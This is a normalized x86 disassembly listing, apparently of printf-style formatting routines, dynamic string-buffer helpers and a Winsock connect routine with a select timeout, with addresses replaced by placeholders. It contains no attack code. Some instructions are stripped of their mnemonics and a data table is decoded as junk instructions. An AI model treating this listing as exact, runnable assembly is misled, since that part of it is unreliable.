mov [ esp + 0x30 ] eax
xor esi esi
mov [ esp + 0x17 ] 0x0
mov [ esp + 0x38 ] r--data
mov eax [ esp + 0x20 ]
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
test bh 0x80
mov [ esp + 0x28 ] eax
je r-xdata
lea ecx [ edx + edx * 2 ]
mov edx [ esp + ecx * 8 + 0x374 ]
test bl 0x10
jne r-xdata
mov edx [ eax + 0x10 ]
mov [ edx ] ebp
jmp r-xdata
test bh 0x8
je r-xdata
mov [ esp + 0x20 ] 0x8
mov [ esp + 0x17 ] 0x0
jmp r-xdata
cmp [ esp + 0x28 ] 0xffffffff
jne r-xdata
mov eax [ esp + 0x10 ]
dec eax
test eax eax
mov [ esp + 0x10 ] eax
jle r-xdata
mov ebx [ esp + 0xf68 ]
mov esi eax
mov [ esp + 0x10 ] 0x0
test [ eax + 0x4 ] 0x4
jne r-xdata
push esi
push 0x22
call edi
add esp 0x8
xor edx edx
cmp eax 0xffffffff
mov eax [ esp + 0x18 ]
setne dl
add ebp edx
mov ecx edx
mov [ esp + 0x24 ] ecx
cmp edx 0xffffffff
je r-xdata
mov [ esp + 0x20 ] rw-data
mov [ esp + 0x24 ] ecx
jmp r-xdata
mov edx [ esp + 0x18 ]
test [ edx + 0x4 ] 0x4
jne r-xdata
movsx edx al
push esi
push edx
call edi
add esp 0x8
xor ecx ecx
cmp eax 0xffffffff
mov al [ ebx + 0x1 ]
setne cl
add ebp ecx
inc ebx
test al al
jne r-xdata
lea ebx [ eax + 0x1 ]
lea edx [ esp + 0x163 ]
test esi esi
mov [ esp + 0x24 ] edx
ja r-xdata
mov [ esp + 0x28 ] 0x1
test bl 0x4
je r-xdata
mov edx [ esp + 0x18 ]
mov eax [ edx + 0xc ]
lea eax [ eax + eax * 2 ]
mov ecx [ esp + eax * 8 + 0x374 ]
mov [ esp + 0x28 ] ecx
mov ecx [ eax + 0x10 ]
mov [ ecx ] bp
mov eax [ eax + 0x10 ]
mov [ eax ] ebp
jmp r-xdata
test bl 0x40
mov [ esp + 0x20 ] 0xa
je r-xdata
test bh 0x10
mov [ esp + 0x38 ] r--data
jne r-xdata
mov ebx [ esp + 0xf68 ]
mov esi eax
push ebx
push 0x20
call edi
add esp 0x8
xor ecx ecx
cmp eax 0xffffffff
setne cl
add ebp ecx
dec esi
jne r-xdata
mov ecx [ esp + 0x30 ]
mov eax [ esp + 0x24 ]
mov edx eax
dec eax
test edx edx
jbe r-xdata
mov ebx [ esp + 0x10 ]
mov eax ebx
dec ebx
test eax eax
mov [ esp + 0x10 ] ebx
jle r-xdata
mov eax [ esp + 0x10 ]
mov ecx eax
dec eax
test ecx ecx
jle r-xdata
push esi
push 0x20
call edi
add esp 0x8
xor ecx ecx
cmp eax 0xffffffff
setne cl
add ebp ecx
mov ecx [ esp + 0x10 ]
dec ebx
dec ecx
test ebx ebx
mov [ esp + 0x10 ] ecx
ja r-xdata
mov eax [ esp + 0x20 ]
cdq
mov edi eax
mov ebx edx
jmp r-xdata
test ecx ecx
jbe r-xdata
test bl 0x2
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x44 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
test ecx ecx
setl al
test al al
mov [ esp + 0x17 ] al
je r-xdata
mov ecx [ esp + 0x18 ]
mov esi [ ecx + 0x14 ]
mov eax [ ecx + 0x10 ]
test esi esi
jg r-xdata
mov [ esp + 0x20 ] 0x10
mov [ esp + 0x17 ] 0x0
jmp r-xdata
mov [ esp + 0x38 ] r--data
push ebx
push 0x20
call edi
add esp 0x8
xor ecx ecx
cmp eax 0xffffffff
setne cl
add ebp ecx
dec esi
jne r-xdata
jmp r-xdata
mov edx [ esp + 0x18 ]
test [ edx + 0x4 ] 0x4
je r-xdata
lea ebx [ eax + 0x1 ]
inc ebx
lea ebx [ eax + 0x1 ]
push ebx
push edi
push esi
push ecx
call sub_40d270
mov ecx [ esp + 0x38 ]
push ebx
push edi
push esi
mov dl [ eax + ecx ]
mov eax [ esp + 0x30 ]
mov [ eax ] dl
dec eax
mov [ esp + 0x30 ] eax
mov eax [ esp + 0x3c ]
push eax
call sub_40d200
mov esi edx
mov [ esp + 0x30 ] eax
test esi esi
ja r-xdata
mov edx [ esp + 0x24 ]
mov edi [ esp + 0x10 ]
mov eax edx
lea ecx [ esp + 0x163 ]
sub eax ecx
mov ecx [ esp + 0x28 ]
add edi eax
add ecx eax
mov al [ esp + 0x1f ]
mov [ esp + 0x10 ] edi
test al al
je r-xdata
test bl 0x1
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x44 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax ecx
cdq
mov [ esp + 0x30 ] eax
mov esi edx
jmp r-xdata
neg ecx
mov [ esp + 0x17 ] 0x0
mov [ esp + 0x30 ] eax
jmp r-xdata
jl r-xdata
mov eax [ esp + 0x18 ]
test [ eax + 0x4 ] 0x8
je r-xdata
mov eax [ esp + 0x10 ]
mov ecx eax
dec eax
test ecx ecx
jle r-xdata
mov ecx [ esp + 0x20 ]
push esi
movsx eax [ ecx ]
inc ecx
push eax
mov [ esp + 0x28 ] ecx
call edi
add esp 0x8
xor ecx ecx
cmp eax 0xffffffff
setne cl
add ebp ecx
dec ebx
jne r-xdata
push esi
push 0x20
call edi
add esp 0x8
xor ecx ecx
cmp eax 0xffffffff
setne cl
add ebp ecx
mov ecx [ esp + 0x10 ]
dec ebx
dec ecx
test ebx ebx
mov [ esp + 0x10 ] ecx
ja r-xdata
push esi
push 0x20
call edi
add esp 0x8
xor edx edx
cmp eax 0xffffffff
setne dl
add ebp edx
dec ebx
jne r-xdata
jmp r-xdata
mov ecx [ esp + 0x30 ]
jb r-xdata
test ecx ecx
jle r-xdata
cmp [ esp + 0x20 ] 0x8
jne r-xdata
test bl 0x8
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x44 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x30 ]
neg eax
adc esi 0x0
mov [ esp + 0x17 ] 0x1
neg esi
mov [ esp + 0x30 ] eax
jmp r-xdata
test eax eax
jae r-xdata
push esi
push 0x22
call edi
add esp 0x8
xor ecx ecx
cmp eax 0xffffffff
setne cl
add ebp ecx
jmp r-xdata
lea ebx [ eax + 0x1 ]
test eax eax
ja r-xdata
test al al
je r-xdata
sub edi ecx
mov esi ecx
dec ecx
mov [ esp + 0x10 ] edi
test esi esi
jle r-xdata
test ecx ecx
jg r-xdata
lea edi [ esp + 0x44 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
mov eax [ esp + 0x10 ]
not ecx
dec ecx
test eax eax
lea ebx [ esp + ecx + 0x44 ]
jl r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x44 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
push esi
push 0x20
call edi
add esp 0x8
xor edx edx
cmp eax 0xffffffff
setne dl
add ebp edx
dec ebx
jne r-xdata
mov al [ esp + 0x17 ]
test al al
jne r-xdata
cmp [ esp + 0x20 ] 0x10
jne r-xdata
inc ecx
mov [ edx ] 0x30
dec edx
dec edi
mov [ esp + 0x24 ] edx
mov [ esp + 0x10 ] edi
mov eax [ esp + 0x28 ]
test eax eax
jl r-xdata
push eax
push rw-data
push ebx
call sub_40a420
add esp 0xc
add ebx eax
dec edi
mov [ esp + 0x10 ] edi
mov edx [ esp + 0x18 ]
test [ edx + 0x4 ] 0x3
je r-xdata
sub edi 0x2
mov [ esp + 0x10 ] edi
mov [ edx ] 0x30
dec edx
dec ecx
jne r-xdata
mov [ esp + 0x24 ] edx
mov ecx [ esp + 0x18 ]
test [ ecx + 0x4 ] 0x20
je r-xdata
push eax
push rw-data
push ebx
call sub_40a420
add esp 0xc
add ebx eax
mov ebx [ esp + 0xf68 ]
mov esi [ esp + 0xf6c ]
test ah 0x1
jne r-xdata
mov eax [ esp + 0x18 ]
mov eax [ eax + 0x4 ]
test al 0x4
jne r-xdata
mov eax [ esp + 0x18 ]
mov eax [ eax + 0x4 ]
test eax 0x40000
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi [ esp + 0x18 ]
mov eax [ edi + 0x4 ]
test al 0x2
je r-xdata
push ebx
push 0x2d
call esi
mov edi [ esp + 0x20 ]
add esp 0x8
xor ecx ecx
cmp eax 0xffffffff
setne cl
add ebp ecx
jmp r-xdata
mov ecx edi
dec edi
test ecx ecx
mov [ esp + 0x10 ] edi
jle r-xdata
test eax 0x80000
je r-xdata
test ah 0x10
mov edi rw-data
jne r-xdata
test al 0x1
je r-xdata
push ebx
push 0x2b
call esi
add esp 0x8
xor edx edx
cmp eax 0xffffffff
setne dl
add ebp edx
jmp r-xdata
mov al [ esp + 0x1f ]
test al al
je r-xdata
mov ebx [ esp + 0xf68 ]
mov esi [ esp + 0xf6c ]
inc edi
mov edi rw-data
test ah 0x10
mov edi rw-data
jne r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov eax [ esp + 0x18 ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ eax + 0x14 ]
mov edx [ eax + 0x10 ]
push ecx
lea eax [ esp + 0x48 ]
push edx
lea ecx [ esp + 0x6c ]
push eax
push ecx
call [ sprintf@IAT ]
mov al [ esp + 0x74 ]
add esp 0x10
test al al
lea esi [ esp + 0x64 ]
je r-xdata
mov edi rw-data
jmp r-xdata
push ebx
push 0x20
call esi
add esp 0x8
xor ecx ecx
cmp eax 0xffffffff
setne cl
add ebp ecx
mov eax [ edi + 0x4 ]
test al 0x4
jne r-xdata
cmp [ esp + 0x20 ] 0x10
jne r-xdata
push ebx
push 0x20
call esi
mov ecx [ esp + 0x18 ]
add esp 0x8
xor edx edx
cmp eax 0xffffffff
setne dl
add ebp edx
dec edi
dec ecx
test edi edi
mov [ esp + 0x10 ] ecx
ja r-xdata
jmp r-xdata
mov ebx [ esp + 0xf68 ]
mov edi [ esp + 0xf6c ]
mov edi rw-data
jmp r-xdata
mov edi [ esp + 0x24 ]
lea edx [ esp + 0x163 ]
inc edi
cmp edi edx
ja r-xdata
test ah 0x1
je r-xdata
push ebx
push 0x30
call esi
add esp 0x8
xor edx edx
cmp eax 0xffffffff
mov eax [ edi + 0x4 ]
setne dl
add ebp edx
push ebx
test ah 0x10
je r-xdata
mov al [ esp + 0x17 ]
test al al
je r-xdata
movsx edx al
push ebx
push edx
call edi
add esp 0x8
xor ecx ecx
cmp eax 0xffffffff
mov al [ esi + 0x1 ]
setne cl
add ebp ecx
inc esi
test al al
jne r-xdata
jmp r-xdata
mov eax [ esp + 0x18 ]
test [ eax + 0x4 ] 0x4
je r-xdata
movsx eax [ edi ]
push ebx
push eax
call esi
add esp 0x8
xor ecx ecx
cmp eax 0xffffffff
lea edx [ esp + 0x163 ]
setne cl
add ebp ecx
inc edi
cmp edi edx
jbe r-xdata
mov eax [ esp + 0x10 ]
mov ecx eax
dec eax
test ecx ecx
mov [ esp + 0x10 ] eax
jle r-xdata
push 0x78
call esi
add esp 0x8
xor edx edx
cmp eax 0xffffffff
setne dl
add ebp edx
push 0x58
call esi
add esp 0x8
xor ecx ecx
cmp eax 0xffffffff
setne cl
add ebp ecx
jmp r-xdata
mov eax [ esp + 0x10 ]
mov ecx eax
dec eax
test ecx ecx
mov [ esp + 0x10 ] eax
jle r-xdata
mov edx eax
lea edi [ edx + 0x1 ]
mov ebx [ esp + 0xf68 ]
mov edi [ esp + 0xf6c ]
mov edx eax
lea esi [ edx + 0x1 ]
push ebx
push 0x30
call esi
add esp 0x8
xor ecx ecx
cmp eax 0xffffffff
setne cl
add ebp ecx
mov ecx [ esp + 0x10 ]
dec edi
dec ecx
test edi edi
mov [ esp + 0x10 ] ecx
ja r-xdata
push ebx
push 0x20
call edi
add esp 0x8
xor ecx ecx
cmp eax 0xffffffff
setne cl
add ebp ecx
dec esi
jne r-xdata
jmp r-xdata
sub_409bc0
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ _isctype@IAT ]
xor ebx ebx
mov eax [ _pctype@IAT ]
movsx edx [ esi ]
mov ecx [ eax ]
mov al [ ecx + edx * 2 ]
and eax 0x4
movsx ecx [ esi ]
push 0x4
push ecx
call edi
add esp 0x8
jmp r-xdata
test ebx ebx
je r-xdata
movsx eax [ esi ]
lea edx [ ebx + ebx * 4 ]
inc esi
lea ebx [ eax + edx * 2 - 0x30 ]
jmp r-xdata
test eax eax
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn
cmp [ esi ] 0x24
jne r-xdata
mov eax [ __mb_cur_max@IAT ]
cmp [ eax ] 0x1
jle r-xdata
mov ecx [ esp + 0x14 ]
inc esi
pop edi
mov eax ebx
mov [ ecx ] esi
pop esi
pop ebx
retn
sub_409c30
sub esp 0xc
mov eax [ esp + 0x10 ]
push ebx
push ebp
mov ebp [ esp + 0x1c ]
push esi
mov [ esp + 0x1c ] eax
mov dl [ eax ]
push edi
xor edi edi
xor ecx ecx
test dl dl
mov [ esp + 0x10 ] ecx
je r-xdata
xor edx edx
test ecx ecx
jle r-xdata
mov cl [ eax ]
inc eax
cmp cl 0x25
mov [ esp + 0x20 ] eax
jne r-xdata
pop edi
pop esi
pop ebp
mov eax ecx
pop ebx
add esp 0xc
retn
mov eax [ esp + 0x2c ]
lea esi [ eax - 0x8 ]
lea ecx [ eax - 0x4 ]
lea eax [ ebp + 0x10 ]
cmp [ eax ] 0x0
jne r-xdata
cmp [ eax ] 0x25
jne r-xdata
mov edi [ eax - 0x10 ]
cmp edi 0x9
ja r-xdata
cmp [ eax + 0x8 ] 0x9
jne r-xdata
mov ecx [ esp + 0x10 ]
lea edx [ esp + 0x20 ]
xor ebx ebx
inc edi
push edx
push eax
mov [ esp + 0x2c ] edi
call sub_409bc0
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
inc eax
mov [ esp + 0x20 ] eax
jmp r-xdata
mov edi [ esp + 0x10 ]
add eax 0x18
cmp edx edi
jl r-xdata
jmp [ edi * 4 + jump_table_40a178 ]
mov edi [ ecx + 0x4 ]
add ecx 0x4
add esi 0x4
mov [ eax + 0x18 ] edi
cmp esi [ esp + 0x10 ]
jle r-xdata
mov esi edi
mov edi [ esp + 0x10 ]
inc edx
cmp edx edi
jge r-xdata
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
mov ebx [ eax - 0xc ]
test bl 0x40
je r-xdata
mov edi [ ecx + 0x4 ]
add ecx 0x4
add esi 0x4
mov [ eax ] edi
jmp r-xdata
fld [ esi + 0x8 ]
add ecx 0x8
add esi 0x8
fstp [ eax ]
jmp r-xdata
mov [ eax - 0x10 ] 0x3
mov eax [ esp + 0x20 ]
xor edi edi
mov [ esp + 0x14 ] edi
mov [ esp + 0x18 ] edi
mov cl [ eax ]
push ecx
call sub_40a1a0
add esp 0x4
test eax eax
je r-xdata
mov [ esp + 0x10 ] esi
mov edi [ esi + 0x8 ]
add ecx 0x8
add esi 0x8
mov [ eax ] edi
mov edi [ esi + 0x4 ]
mov [ eax + 0x4 ] edi
jmp r-xdata
mov ecx [ esp + 0x20 ]
movsx eax [ ecx ]
add eax 0xffffffbb
cmp eax 0x33
ja r-xdata
mov eax [ esp + 0x20 ]
movsx edi [ eax ]
sub edi 0x20
inc eax
cmp edi 0x5a
mov [ esp + 0x20 ] eax
ja r-xdata
lea edx [ esi + esi * 2 - 0x3 ]
lea eax [ ebp + edx * 8 ]
mov [ eax ] 0x0
xor edx edx
mov dl [ eax + lookup_table_40a144 ]
jmp [ edx * 4 + jump_table_40a104 ]
mov al [ eax ]
push eax
call sub_40a1a0
add esp 0x4
test eax eax
jne r-xdata
xor edx edx
mov dl [ edi + lookup_table_40a0a8 ]
jmp [ edx * 4 + jump_table_40a070 ]
xor esi esi
lea ecx [ edi - 0x1 ]
xor esi esi
mov [ eax + 0x8 ] ecx
lea eax [ ecx + ecx * 2 ]
lea eax [ ebp + eax * 8 ]
mov [ eax ] 0x9
lea ecx [ eax + 0xc ]
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] esi
mov [ ecx ] esi
jmp r-xdata
or ebx 0x8
lea eax [ esi + esi * 2 - 0x3 ]
lea eax [ ebp + eax * 8 ]
mov [ eax ] 0x1
jmp r-xdata
lea ecx [ esi + esi * 2 - 0x3 ]
lea eax [ ebp + ecx * 8 ]
mov [ eax ] 0x4
jmp r-xdata
lea edx [ esi + esi * 2 - 0x3 ]
lea eax [ ebp + edx * 8 ]
mov [ eax ] 0x2
jmp r-xdata
lea eax [ esi + esi * 2 - 0x3 ]
lea eax [ ebp + eax * 8 ]
mov [ eax ] 0x3
jmp r-xdata
lea ecx [ esi + esi * 2 - 0x3 ]
or bh 0x2
lea eax [ ebp + ecx * 8 ]
mov [ eax ] 0x3
jmp r-xdata
lea edx [ esi + esi * 2 - 0x3 ]
or bh 0x4
lea eax [ ebp + edx * 8 ]
mov [ eax ] 0x3
jmp r-xdata
lea eax [ esi + esi * 2 - 0x3 ]
or bh 0x8
lea eax [ ebp + eax * 8 ]
mov [ eax ] 0x3
jmp r-xdata
lea ecx [ esi + esi * 2 - 0x3 ]
or bh 0x18
lea eax [ ebp + ecx * 8 ]
mov [ eax ] 0x3
jmp r-xdata
lea edx [ esi + esi * 2 - 0x3 ]
or ebx 0x20000
lea eax [ ebp + edx * 8 ]
mov [ eax ] 0x3
jmp r-xdata
lea eax [ esi + esi * 2 - 0x3 ]
lea eax [ ebp + eax * 8 ]
mov [ eax ] 0x7
jmp r-xdata
lea ecx [ esi + esi * 2 - 0x3 ]
or ebx 0x40000
lea eax [ ebp + ecx * 8 ]
mov [ eax ] 0x7
jmp r-xdata
lea edx [ esi + esi * 2 - 0x3 ]
or ebx 0x41000
lea eax [ ebp + edx * 8 ]
mov [ eax ] 0x7
jmp r-xdata
lea eax [ esi + esi * 2 - 0x3 ]
or ebx 0x80000
lea eax [ ebp + eax * 8 ]
mov [ eax ] 0x7
jmp r-xdata
lea ecx [ esi + esi * 2 - 0x3 ]
or ebx 0x81000
lea eax [ ebp + ecx * 8 ]
mov [ eax ] 0x7
jmp r-xdata
mov edi [ esp + 0x14 ]
or ebx 0x1
jmp r-xdata
or ebx 0x2
jmp r-xdata
and bh 0xfe
or ebx 0x4
jmp r-xdata
or ebx 0x8
jmp r-xdata
mov cl [ eax ]
or bh 0x80
cmp cl 0x2a
jne r-xdata
or ebx 0x10
jmp r-xdata
test bl 0x20
je r-xdata
or ebx 0x40
jmp r-xdata
or bl 0x80
jmp r-xdata
test bl 0x4
jne r-xdata
or bh 0x20
lea edx [ esp + 0x20 ]
push 0xa
dec eax
push edx
push eax
call [ strtol@IAT ]
add esp 0xc
mov [ esp + 0x14 ] eax
jmp r-xdata
mov edi [ esp + 0x24 ]
lea ecx [ esp + 0x20 ]
or bh 0x40
inc edi
push ecx
push eax
mov [ esp + 0x2c ] edi
call sub_409bc0
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x28 ]
mov edi [ esp + 0x24 ]
add ecx 0x4
lea edx [ eax + 0x1 ]
mov [ esp + 0x28 ] ecx
mov [ ecx - 0x4 ] edx
lea eax [ edx - 0x1 ]
mov [ ecx ] eax
lea ecx [ eax + eax * 2 ]
lea eax [ ebp + ecx * 8 ]
mov [ eax ] 0x9
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] esi
mov [ eax + 0xc ] esi
test ebx 0x10000
je r-xdata
mov edx [ esp + 0x18 ]
lea ecx [ eax + 0xc ]
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] edi
test bh 0x40
mov [ ecx ] edx
je r-xdata
lea ecx [ esp + 0x20 ]
push 0xa
push ecx
push eax
or bh 0x80
call [ strtol@IAT ]
add esp 0xc
mov [ esp + 0x18 ] eax
jmp r-xdata
mov edi [ esp + 0x24 ]
or ebx 0x10000
lea ecx [ esp + 0x20 ]
inc eax
inc edi
push ecx
push eax
mov [ esp + 0x28 ] eax
mov [ esp + 0x2c ] edi
call sub_409bc0
add esp 0x8
test eax eax
je r-xdata
or ebx 0x20
jmp r-xdata
or bh 0x1
mov eax [ esp + 0x20 ]
mov edx [ esp + 0x24 ]
mov [ esp + 0x14 ] edx
mov eax edx
mov [ esp + 0x14 ] eax
jmp r-xdata
mov edx [ esp + 0x24 ]
mov [ esp + 0x18 ] edx
mov eax edx
mov [ esp + 0x18 ] eax
jmp r-xdata
mov [ esp + 0x10 ] eax
cmp eax [ esp + 0x10 ]
jle r-xdata
jmp r-xdata
cmp eax [ esp + 0x10 ]
jle r-xdata
sub_40a1d2
add [ eax ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ eax ] al
add [ eax ] eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] al
add [ eax ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] al
add [ ecx ] eax
add [ ecx ] al
add [ ecx ] eax
add [ eax ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ eax - 0x6f6f6f70 ] dl
mov ecx [ esp + 0x8 ]
mov eax [ ecx + 0x4 ]
mov edx [ ecx + 0x8 ]
cmp eax edx
jae r-xdata
or eax 0xffffffff
retn
mov edx [ ecx ]
mov eax [ esp + 0x4 ]
mov [ edx ] al
mov edx [ ecx ]
inc edx
mov [ ecx ] edx
mov edx [ ecx + 0x4 ]
inc edx
mov [ ecx + 0x4 ] edx
retn
sub_40a280
sub esp 0xc
mov ecx [ esp + 0x10 ]
lea eax [ esp + 0x14 ]
push eax
push ecx
lea edx [ esp + 0x8 ]
push sub_40a310
push edx
mov [ esp + 0x10 ] 0x0
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x18 ] 0x0
call sub_409100
add esp 0x10
cmp eax 0xffffffff
mov eax [ esp + 0x8 ]
jne r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
push rw-data
call [ _strdup@IAT ]
add esp 0x4
add esp 0xc
retn
mov ecx [ esp ]
mov edx [ esp + 0x4 ]
mov [ edx + ecx ] 0x0
mov eax [ esp ]
add esp 0xc
retn
xor eax eax
add esp 0xc
retn
mov eax [ esp ]
push eax
call [ free@IAT ]
add esp 0x4
sub_40a310
push esi
mov esi [ esp + 0xc ]
mov eax [ esi ]
test eax eax
jne r-xdata
mov edx [ esi + 0x4 ]
mov ecx [ esi + 0x8 ]
inc edx
cmp edx ecx
jb r-xdata
push 0x20
call [ malloc@IAT ]
add esp 0x4
mov [ esi ] eax
test eax eax
jne r-xdata
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ esp + 0x8 ]
mov [ ecx + edx ] al
mov ecx [ esi + 0x4 ]
inc ecx
mov [ esi + 0x4 ] ecx
pop esi
retn
add ecx ecx
push ecx
push eax
call [ realloc@IAT ]
add esp 0x8
test eax eax
jne r-xdata
mov [ esi + 0x8 ] 0x20
mov [ esi + 0x4 ] 0x0
jmp r-xdata
or eax 0xffffffff
pop esi
retn
mov edx [ esi + 0x8 ]
mov [ esi ] eax
shl edx 0x1
mov [ esi + 0x8 ] edx
or eax 0xffffffff
pop esi
retn
sub_40a390
sub esp 0xc
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x10 ]
push eax
push ecx
lea edx [ esp + 0x8 ]
push sub_40a310
push edx
mov [ esp + 0x10 ] 0x0
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x18 ] 0x0
call sub_409100
add esp 0x10
cmp eax 0xffffffff
mov eax [ esp + 0x8 ]
jne r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
push rw-data
call [ _strdup@IAT ]
add esp 0x4
add esp 0xc
retn
mov ecx [ esp ]
mov edx [ esp + 0x4 ]
mov [ edx + ecx ] 0x0
mov eax [ esp ]
add esp 0xc
retn
xor eax eax
add esp 0xc
retn
mov eax [ esp ]
push eax
call [ free@IAT ]
add esp 0x4
sub_40a4c0
sub esp 0x210
mov ecx [ esp + 0x218 ]
mov eax 0x10624dd3
imul ecx
sar edx 0x6
mov eax edx
push esi
shr eax 0x1f
add edx eax
mov esi [ esp + 0x218 ]
mov [ esp + 0x4 ] edx
mov [ esp + 0x114 ] esi
lea eax [ edx + edx * 4 ]
mov [ esp + 0x110 ] 0x1
mov [ esp + 0x10 ] esi
mov [ esp + 0xc ] 0x1
lea eax [ eax + eax * 4 ]
lea edx [ eax + eax * 4 ]
shl edx 0x3
sub ecx edx
lea edx [ esp + 0xc ]
lea eax [ ecx + ecx * 4 ]
lea ecx [ esp + 0x4 ]
push ecx
push edx
lea eax [ eax + eax * 4 ]
lea ecx [ esi + 0x1 ]
lea eax [ eax + eax * 4 ]
shl eax 0x3
mov [ esp + 0x10 ] eax
lea eax [ esp + 0x118 ]
push eax
push 0x0
push ecx
call [ select@IAT ]
cmp eax 0xffffffff
jne r-xdata
test eax eax
jne r-xdata
or eax eax
pop esi
add esp 0x210
retn
lea edx [ esp + 0xc ]
push edx
push esi
call __WSAFDIsSet
neg eax
sbb eax eax
pop esi
and eax 0x2
add esp 0x210
retn
mov eax 0x1
pop esi
add esp 0x210
retn
sub_40a590
sub esp 0x20
mov eax [ esp + 0x24 ]
push ebx
push ebp
push esi
mov ebx [ eax ]
push edi
mov [ esp + 0x14 ] ebx
call sub_40a9a0
mov ecx [ esp + 0x48 ]
mov [ esp + 0x18 ] eax
mov [ esp + 0x1c ] edx
mov ebp 0x493e0
mov [ ecx ] 0x0
mov eax [ ebx + 0x88 ]
test eax eax
jne r-xdata
mov edx [ ebx + 0x234 ]
mov eax [ ebx + 0x230 ]
push edx
push eax
call sub_40a9a0
push edx
push eax
call sub_40aa00
mov [ esp + 0x20 ] eax
mov eax [ ebx + 0x88 ]
fild [ esp + 0x20 ]
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebx + 0x8c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8c ]
mov ecx [ ebx + 0x8c ]
test ecx ecx
je r-xdata
xor edi edi
mov [ esp + 0x10 ] edi
jmp r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1c
pop ebx
add esp 0x20
retn
test eax eax
jne r-xdata
cmp eax ecx
jl r-xdata
mov ecx [ esp + 0x38 ]
mov edx [ ecx ]
mov eax [ edx + 0xc ]
cmp [ eax + edi * 4 ] 0x0
je r-xdata
lea eax [ eax + eax * 4 ]
lea eax [ ecx + ecx * 4 ]
jmp r-xdata
mov edx [ esp + 0x40 ]
mov [ edx ] 0xffffffff
push 0x0
push 0x1
push 0x2
call [ socket@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
lea ebp [ eax + eax * 4 ]
lea ebp [ ebp + ebp * 4 ]
shl ebp 0x3
call _ftol
sub ebp eax
jns r-xdata
pop edi
pop esi
pop ebp
mov eax 0x7
pop ebx
add esp 0x20
retn
mov al [ ebx + 0x18a ]
test al al
je r-xdata
mov eax [ esp + 0x38 ]
xor edx edx
mov [ esp + 0x20 ] edx
mov eax [ eax ]
mov [ esp + 0x24 ] edx
mov [ esp + 0x28 ] edx
mov [ esp + 0x2c ] edx
mov ecx [ eax + 0xc ]
mov edx [ ecx + edi * 4 ]
mov ecx [ edx ]
mov [ esp + 0x24 ] ecx
mov dx [ eax + 0x8 ]
mov eax [ esp + 0x3c ]
mov [ esp + 0x20 ] dx
push eax
call [ htons@IAT ]
push 0x1
push esi
mov [ esp + 0x2a ] ax
call sub_40a4a0
add esp 0x8
lea ecx [ esp + 0x20 ]
push 0x10
push ecx
push esi
call [ connect@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
mov ecx [ esp + 0x34 ]
push esi
push ecx
call sub_40a7f0
add esp 0x8
cmp edi 0x1
jne r-xdata
call GetLastError
cmp eax 0xb
je r-xdata
test edi edi
jne r-xdata
cmp [ ebx + 0x2a8 ] 0x2
je r-xdata
